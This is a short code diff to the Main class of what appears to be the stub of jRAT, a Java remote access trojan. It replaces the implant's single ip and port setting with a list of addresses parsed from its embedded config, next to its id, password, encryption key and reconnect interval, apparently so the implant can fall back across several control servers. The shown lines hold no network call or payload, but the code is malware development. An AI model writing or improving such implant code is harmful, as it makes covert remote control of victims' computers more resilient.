@@ -19,8 +19,7 @@ import pro.jrat.stub.utils.Utils;
 
 public class Main {
 
-	public static String ip;
-	public static int port;
+	public static String[] addresses;
 	public static String id;
 	public static String pass;
 	public static byte[] encryptionKey;
@@ -70,8 +69,7 @@ public class Main {
 				config.put(ckey, cval);
 			}
 
-			ip = config.get("ip");
-			port = Integer.parseInt(config.get("port"));
+			addresses = config.get("addresses").split(",");
 			id = config.get("id");
 			pass = config.get("pass");
 			reconnectSeconds = Long.parseLong(config.get("reconsec"));
@@ -188,12 +186,8 @@ public class Main {
 		return pass;
 	}
 
-	public static int getPort() {
-		return port;
-	}
-
-	public static String getIP() {
-		return ip;
+	public static String[] getAddresses() {
+		return addresses;
 	}
 
 	public static String getID() {
